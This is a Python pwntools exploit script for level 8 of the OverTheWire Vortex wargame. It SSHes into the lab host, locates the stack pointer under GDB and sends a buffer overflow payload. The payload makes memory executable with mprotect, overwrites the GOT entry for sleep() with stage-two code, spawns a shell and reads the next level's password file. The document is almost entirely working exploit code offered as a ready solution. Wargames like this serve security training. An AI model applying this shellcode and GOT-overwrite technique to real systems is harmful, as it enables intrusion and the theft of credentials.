#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn   import *
context(arch = 'i386', os = 'linux')


level    = 8
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

if not os.path.exists(chal):
    shell.download_file(binary)
    os.chmod(chal, 0755)

elf = ELF('./vortex8')

# Helper script to make addresses sane
shell.set_working_directory()
shell.upload_file('r.sh')

#
# Find ESP by running the binary under GDB with the r.sh script
# and breaking on 0x0804861f
#
log.info("Finding ESP by breaking on:\n%s" % elf.disasm(0x0804861f, 1))
gdb = shell.run("bash r.sh gdb %s $'%s'" % (binary, cyclic(1200)))
gdb.send("""
set prompt
break *0x0804861f
run
""")
gdb.clean(2)
gdb.sendline('printf "%p\\n",$sp')

ESP = eval(gdb.recv().strip())
log.info("ESP: %#x" % ESP)

gdb.sendline('kill')
gdb.sendline('quit')

# If we just run with a cyclic, we crash with the following
# register context:
#
# EBP: 0x6b616169 (b'iaak')
# EIP: 0x6b61616a (b'jaak')
#
# Shellcode would normally come right after this.
pattern = cyclic(cyclic_find('iaak'))
pattern += p32(ESP+0)
pattern += p32(ESP+5)

# First, change the permissions of all memory to RWX
pattern += '\x90'
pattern += asm(shellcraft.mprotect_all())

# Next swap out the pointer for sleep()
pattern += asm(shellcraft.i386.pushstr(p32(elf.got['sleep'])))
pattern += asm('''
pop eax

jmp GET_STAGE2
HAVE_STAGE2:
pop esi
mov [eax], esi

push SYS_exit
pop eax
int 0x80

GET_STAGE2:
call HAVE_STAGE2
''')

pattern += asm(shellcraft.sh())

# Pad the pattern out to the same length
pattern += cyclic(1200 - len(pattern))
assert '\x00' not in pattern

# Sploit
sh = shell.run("bash r.sh %s $%r" % (binary, pattern))
sh.clean(2)

# Win
sh.sendline('id')
log.success('id: ' + sh.recvline().strip())

sh.sendline('cat %s' % passfile)
password = sh.recvline().strip()
log.success('Password: %s' % password)

print password
